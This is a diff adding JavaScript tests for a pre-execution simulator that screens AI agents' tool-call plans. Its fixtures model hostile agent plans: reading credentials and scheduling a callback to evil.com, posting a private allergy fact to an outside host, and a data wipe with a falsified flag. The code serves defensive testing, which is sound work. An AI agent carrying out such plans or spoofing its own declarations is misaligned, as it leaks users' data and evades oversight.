@@ -1,6 +1,17 @@
 import test from 'node:test';
 import assert from 'node:assert/strict';
 import {
+  ALLOWED_TOOL_CATEGORIES,
+  ALLOWED_LOOKAHEAD_DECISIONS,
+  ALLOWED_LOOKAHEAD_PLAN_FIELDS,
+  ALLOWED_LOOKAHEAD_STEP_FIELDS,
+  ALLOWED_LOOKAHEAD_OPTIONS_FIELDS,
+  MAX_LOOKAHEAD_PLAN_STEPS,
+  LOOKAHEAD_PITFALL_TYPES,
+  validateLookaheadActionPlan,
+  createLookaheadActionPlan,
+  simulateActionPlanLookahead,
+  summarizeLookaheadSimulation,
   ALLOWED_DIALOGUE_SENSITIVITY_TIERS,
   ALLOWED_DIALOGUE_VERDICTS,
   ALLOWED_DIALOGUE_VIOLATION_TYPES,
@@ -6726,4 +6737,406 @@ test('validateDelegationCommitment rejects impossible calendar dates like Februa
   // Impossible deadline (April 31 does not exist)
   const badDeadline = { ...base, created_at: '2026-04-20T10:00:00.000Z', deadline: '2026-04-31T10:00:00.000Z' };
   assert.equal(validateDelegationCommitment(badDeadline).ok, false);
+});
+
+
+// ============================================================================
+// Lookahead Action & Tool Call Pre-Execution Simulator Tests
+// ============================================================================
+
+test('lookahead constants are deeply frozen and contain required definitions', () => {
+  assert.ok(Object.isFrozen(ALLOWED_TOOL_CATEGORIES));
+  assert.ok(Object.isFrozen(ALLOWED_LOOKAHEAD_DECISIONS));
+  assert.ok(Object.isFrozen(ALLOWED_LOOKAHEAD_PLAN_FIELDS));
+  assert.ok(Object.isFrozen(ALLOWED_LOOKAHEAD_STEP_FIELDS));
+  assert.ok(Object.isFrozen(ALLOWED_LOOKAHEAD_OPTIONS_FIELDS));
+  assert.ok(Object.isFrozen(LOOKAHEAD_PITFALL_TYPES));
+  assert.equal(MAX_LOOKAHEAD_PLAN_STEPS, 10);
+
+  assert.ok(ALLOWED_TOOL_CATEGORIES.includes('read'));
+  assert.ok(ALLOWED_TOOL_CATEGORIES.includes('network'));
+  assert.ok(ALLOWED_TOOL_CATEGORIES.includes('storage'));
+  assert.ok(ALLOWED_TOOL_CATEGORIES.includes('system'));
+
+  assert.ok(LOOKAHEAD_PITFALL_TYPES.includes('exfiltration_sequence'));
+  assert.ok(LOOKAHEAD_PITFALL_TYPES.includes('privilege_escalation'));
+  assert.ok(LOOKAHEAD_PITFALL_TYPES.includes('destructive_mutation'));
+  assert.ok(LOOKAHEAD_PITFALL_TYPES.includes('circular_resource_drain'));
+  assert.ok(LOOKAHEAD_PITFALL_TYPES.includes('evasion_spoofing'));
+});
+
+test('validateLookaheadActionPlan accepts well-formed plan and freezes output', () => {
+  const plan = {
+    plan_id: 'plan_test_01',
+    agent_id: 'calendar_agent',
+    objective: 'Schedule dentist appointment',
+    created_at: '2026-10-22T12:00:00.000Z',
+    steps: [
+      {
+        step_id: 'step_1',
+        tool_name: 'read_calendar',
+        category: 'read',
+        parameters: { range: 'today' },
+        taints_output: false,
+        accesses_private_data: false,
+        modifies_state: false,
+        target_resource: 'calendar'
+      }
+    ]
+  };
+
+  const res = validateLookaheadActionPlan(plan);
+  assert.equal(res.ok, true);
+  assert.equal(res.value.plan_id, 'plan_test_01');
+  assert.ok(Object.isFrozen(res.value));
+  assert.ok(Object.isFrozen(res.value.steps));
+  assert.ok(Object.isFrozen(res.value.steps[0]));
+});
+
+test('validateLookaheadActionPlan rejects malformed, invalid, or prototype-polluted inputs fail-closed', () => {
+  assert.equal(validateLookaheadActionPlan(null).ok, false);
+  assert.equal(validateLookaheadActionPlan('not an object').ok, false);
+  assert.equal(validateLookaheadActionPlan([]).ok, false);
+
+  // Prototype pollution
+  const polluted = JSON.parse('{"__proto__": {"admin": true}, "plan_id": "p1", "agent_id": "a1", "objective": "test", "created_at": "2026-10-22T10:00:00Z", "steps": []}');
+  assert.equal(validateLookaheadActionPlan(polluted).ok, false);
+
+  // Unknown fields
+  const extra = {
+    plan_id: 'p1',
+    agent_id: 'a1',
+    objective: 'test',
+    created_at: '2026-10-22T10:00:00Z',
+    steps: [],
+    unauthorized_field: 123
+  };
+  assert.equal(validateLookaheadActionPlan(extra).ok, false);
+
+  // Impossible calendar date (Feb 31)
+  const badDate = {
+    plan_id: 'p1',
+    agent_id: 'a1',
+    objective: 'test',
+    created_at: '2026-02-31T10:00:00Z',
+    steps: [
+      {
+        step_id: 's1',
+        tool_name: 'read_facts',
+        category: 'read',
+        parameters: {},
+        taints_output: false,
+        accesses_private_data: false,
+        modifies_state: false
+      }
+    ]
+  };
+  assert.equal(validateLookaheadActionPlan(badDate).ok, false);
+
+  // Empty steps array
+  const emptySteps = {
+    plan_id: 'p1',
+    agent_id: 'a1',
+    objective: 'test',
+    created_at: '2026-10-22T10:00:00Z',
+    steps: []
+  };
+  assert.equal(validateLookaheadActionPlan(emptySteps).ok, false);
+
+  // Exceeds max steps cap
+  const tooManySteps = {
+    plan_id: 'p1',
+    agent_id: 'a1',
+    objective: 'test',
+    created_at: '2026-10-22T10:00:00Z',
+    steps: Array.from({ length: 11 }, (_, i) => ({
+      step_id: `s_${i}`,
+      tool_name: 'inspect',
+      category: 'read',
+      parameters: {},
+      taints_output: false,
+      accesses_private_data: false,
+      modifies_state: false
+    }))
+  };
+  assert.equal(validateLookaheadActionPlan(tooManySteps).ok, false);
+});
+
+test('simulateActionPlanLookahead validates options and twinState fail-closed', () => {
+  const plan = {
+    plan_id: 'p_test',
+    agent_id: 'tester',
+    objective: 'Test options',
+    created_at: '2026-10-22T12:00:00.000Z',
+    steps: [
+      { step_id: 's1', tool_name: 'test', category: 'read', parameters: {}, taints_output: false, accesses_private_data: false, modifies_state: false }
+    ]
+  };
+
+  // Unknown option
+  const badOpt = simulateActionPlanLookahead(plan, DEFAULT_TWIN_STATE, { unknown_key: true });
+  assert.equal(badOpt.ok, false);
+  assert.equal(badOpt.decision, 'blocked');
+  assert.ok(badOpt.reason.includes('Unknown option field'));
+
+  // Invalid twinState
+  const badState = simulateActionPlanLookahead(plan, { invalid_shape: 123 });
+  assert.equal(badState.ok, false);
+  assert.equal(badState.decision, 'blocked');
+  assert.ok(badState.reason.includes('Twin state validation failed'));
+});
+
+test('createLookaheadActionPlan creates valid plan with defaults', () => {
+  const res = createLookaheadActionPlan({
+    agent_id: 'tester',
+    objective: 'Run diagnostic probe',
+    steps: [
+      {
+        step_id: 's1',
+        tool_name: 'probe',
+        category: 'read',
+        parameters: {},
+        taints_output: false,
+        accesses_private_data: false,
+        modifies_state: false
+      }
+    ]
+  });
+
+  assert.equal(res.ok, true);
+  assert.equal(res.value.agent_id, 'tester');
+  assert.ok(res.value.plan_id.startsWith('plan_'));
+});
+
+test('simulateActionPlanLookahead admits benign read-only plan with deterministic receipt', () => {
+  const plan = {
+    plan_id: 'p_benign',
+    agent_id: 'reader_bot',
+    objective: 'Summarize news topics',
+    created_at: '2026-10-22T14:00:00.000Z',
+    steps: [
+      {
+        step_id: 's1',
+        tool_name: 'get_topics',
+        category: 'read',
+        parameters: {},
+        taints_output: false,
+        accesses_private_data: false,
+        modifies_state: false
+      },
+      {
+        step_id: 's2',
+        tool_name: 'format_summary',
+        category: 'format',
+        parameters: {},
+        taints_output: false,
+        accesses_private_data: false,
+        modifies_state: false
+      }
+    ]
+  };
+
+  const sim = simulateActionPlanLookahead(plan, DEFAULT_TWIN_STATE, { as_of_time: '2026-10-22T14:00:00.000Z' });
+  assert.equal(sim.ok, true);
+  assert.equal(sim.decision, 'admitted');
+  assert.equal(sim.risk_score, 5);
+  assert.equal(sim.pitfalls_detected.length, 0);
+  assert.ok(sim.receipt);
+  assert.equal(sim.receipt.decision, 'admitted');
+  assert.equal(sim.receipt.timestamp, '2026-10-22T14:00:00.000Z');
+  assert.ok(sim.receipt.receipt_id.startsWith('rec_sim_'));
+});
+
+test('simulateActionPlanLookahead detects host-grounded critical memory taint even if caller denies it', () => {
+  // Twin state has critical allergy fact
+  const stateWithAllergy = {
+    ...DEFAULT_TWIN_STATE,
+    facts: [
+      {
+        id: 'f_allergy',
+        category: 'medical',
+        statement: 'Severe penicillin allergy',
+        critical: true,
+        at: '2026-10-01T00:00:00.000Z'
+      }
+    ]
+  };
+
+  // Caller claims accesses_private_data: false and taints_output: false, but accesses allergy statement
+  const sneakyPlan = {
+    plan_id: 'p_sneaky_exfil',
+    agent_id: 'untrusted_assistant',
+    objective: 'Prepare clinic note',
+    created_at: '2026-10-22T14:00:00.000Z',
+    steps: [
+      {
+        step_id: 's1',
+        tool_name: 'read_note',
+        category: 'read',
+        parameters: { text: 'Check severe penicillin allergy constraint' },
+        taints_output: false,
+        accesses_private_data: false,
+        modifies_state: false,
+        target_resource: 'local_notes'
+      },
+      {
+        step_id: 's2',
+        tool_name: 'post_data',
+        category: 'network',
+        parameters: { url: 'https://telemetry-hub.example.com/log' },
+        taints_output: false,
+        accesses_private_data: false,
+        modifies_state: false,
+        target_resource: 'telemetry-hub.example.com'
+      }
+    ]
+  };
+
+  const sim = simulateActionPlanLookahead(sneakyPlan, stateWithAllergy);
+  assert.equal(sim.ok, true);
+  // Must catch the exfiltration sequence despite false caller booleans!
+  assert.equal(sim.decision, 'blocked');
+  assert.ok(sim.pitfalls_detected.includes('exfiltration_sequence'));
+});
+
+test('simulateActionPlanLookahead permits network call when covered by canonical active grant', () => {
+  // Uses valid canonical grant schema: who, what, at, expires_at
+  const activeTwinState = {
+    ...DEFAULT_TWIN_STATE,
+    grants: [
+      {
+        who: 'dentist',
+        what: 'appointment times',
+        at: '2026-10-01T00:00:00.000Z',
+        expires_at: '2026-12-01T00:00:00.000Z'
+      }
+    ]
+  };
+
+  const plan = {
+    plan_id: 'p_granted_network',
+    agent_id: 'dentist_sync_bot',
+    objective: 'Confirm dental appointment',
+    created_at: '2026-10-22T14:00:00.000Z',
+    steps: [
+      {
+        step_id: 's1',
+        tool_name: 'read_profile',
+        category: 'read',
+        parameters: { scope: 'appointments' },
+        taints_output: true,
+        accesses_private_data: true,
+        modifies_state: false
+      },
+      {
+        step_id: 's2',
+        tool_name: 'sync_calendar',
+        category: 'network',
+        parameters: {},
+        taints_output: false,
+        accesses_private_data: false,
+        modifies_state: false,
+        target_resource: 'dentist'
+      }
+    ]
+  };
+
+  const sim = simulateActionPlanLookahead(plan, activeTwinState);
+  assert.equal(sim.ok, true);
+  assert.equal(sim.decision, 'requires_user_confirmation');
+  assert.equal(sim.pitfalls_detected.length, 0);
+});
+
+test('simulateActionPlanLookahead catches destructive evasion attempt when caller claims modifies_state false', () => {
+  const planEvasion = {
+    plan_id: 'p_evade',
+    agent_id: 'sabotage_agent',
+    objective: 'Clear cache',
+    created_at: '2026-10-22T14:00:00.000Z',
+    steps: [
+      {
+        step_id: 's1',
+        tool_name: 'wipe_all',
+        category: 'storage',
+        parameters: {},
+        taints_output: false,
+        accesses_private_data: false,
+        modifies_state: false, // Falsely claims no modification!
+        target_resource: 'wipe_memory'
+      }
+    ]
+  };
+
+  const sim = simulateActionPlanLookahead(planEvasion, DEFAULT_TWIN_STATE);
+  assert.equal(sim.ok, true);
+  assert.equal(sim.decision, 'blocked');
+  assert.ok(sim.pitfalls_detected.includes('destructive_mutation'));
+  assert.ok(sim.pitfalls_detected.includes('evasion_spoofing'));
+});
+
+test('simulateActionPlanLookahead catches stealth trigger in parameter values and circular delegation', () => {
+  // Stealth trigger in parameter values: url with webhook
+  const planStealth = {
+    plan_id: 'p_stealth',
+    agent_id: 'shadow_agent',
+    objective: 'Register delayed beacon',
+    created_at: '2026-10-22T14:00:00.000Z',
+    steps: [
+      { step_id: 's1', tool_name: 'read_creds', category: 'read', parameters: {}, taints_output: true, accesses_private_data: true, modifies_state: false },
+      { step_id: 's2', tool_name: 'schedule_task', category: 'storage', parameters: { url: 'https://evil.com/webhook', type: 'callback' }, taints_output: false, accesses_private_data: false, modifies_state: true }
+    ]
+  };
+
+  const simStealth = simulateActionPlanLookahead(planStealth, DEFAULT_TWIN_STATE);
+  assert.equal(simStealth.ok, true);
+  assert.equal(simStealth.decision, 'blocked');
+  assert.ok(simStealth.pitfalls_detected.includes('stealth_callback_trigger'));
+
+  // Circular delegation
+  const planCircular = {
+    plan_id: 'p_circ',
+    agent_id: 'swarm_agent',
+    objective: 'Delegation ping pong',
+    created_at: '2026-10-22T14:00:00.000Z',
+    steps: [
+      { step_id: 's1', tool_name: 'delegate_a', category: 'delegation', parameters: {}, taints_output: false, accesses_private_data: false, modifies_state: false },
+      { step_id: 's2', tool_name: 'delegate_b', category: 'delegation', parameters: {}, taints_output: false, accesses_private_data: false, modifies_state: false },
+      { step_id: 's3', tool_name: 'delegate_c', category: 'delegation', parameters: {}, taints_output: false, accesses_private_data: false, modifies_state: false }
+    ]
+  };
+
+  const simCirc = simulateActionPlanLookahead(planCircular, DEFAULT_TWIN_STATE);
+  assert.equal(simCirc.ok, true);
+  assert.equal(simCirc.decision, 'blocked');
+  assert.ok(simCirc.pitfalls_detected.includes('circular_resource_drain'));
+});
+
+test('summarizeLookaheadSimulation produces plain language summaries without internal jargon', () => {
+  const admittedRes = {
+    ok: true,
+    decision: 'admitted',
+    steps_simulated: 2,
+    risk_score: 5,
+    pitfalls_detected: []
+  };
+  const sumAdmitted = summarizeLookaheadSimulation(admittedRes);
+  assert.equal(sumAdmitted.ok, true);
+  assert.equal(sumAdmitted.risk_label, 'Low risk');
+  assert.ok(sumAdmitted.text.includes('Safe to run'));
+  assert.ok(!sumAdmitted.text.includes('tier'));
+  assert.ok(!sumAdmitted.text.includes('ticket'));
+
+  const blockedRes = {
+    ok: true,
+    decision: 'blocked',
+    steps_simulated: 3,
+    risk_score: 70,
+    pitfalls_detected: ['exfiltration_sequence', 'evasion_spoofing']
+  };
+  const sumBlocked = summarizeLookaheadSimulation(blockedRes);
+  assert.equal(sumBlocked.ok, true);
+  assert.equal(sumBlocked.risk_label, 'High risk');
+  assert.ok(sumBlocked.text.includes('Blocked'));
+  assert.ok(sumBlocked.text.includes('private data leak over network'));
+  assert.ok(sumBlocked.text.includes('mutation gate evasion attempt'));
 });
